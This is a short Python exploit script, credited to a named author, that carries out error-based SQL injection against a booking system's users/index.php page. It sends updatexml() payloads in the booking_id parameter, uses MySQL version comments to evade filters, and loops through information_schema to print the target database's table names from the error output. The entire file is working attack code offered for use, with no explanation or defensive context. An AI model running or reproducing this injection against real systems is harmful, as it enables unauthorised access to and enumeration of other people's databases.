#!/usr/bin/python3
# Coded By Mhammad (0xsecurity.com)

import requests
import re

def tables():
  i = 0
  while (i < 186):
    URL = 'https://domain.tld/users/index.php'
    PARAMS = "ref=guest_list&booking_id=3944658+and+updatexml(null,concat(0x0a,(select+/*!50000table_name*/+from+/*!50000information_schema.tables*/+where+/*!50000table_schema*/=0x64625f6f665f646f6d61696e+limit+"+str(i)+",1)),null)"
    r = requests.get(url = URL,params = PARAMS)
    FOUND = re.search(r"(.*)'<br",r.text)
    i = i + 1
    print(FOUND.group(1))

print()
tables()
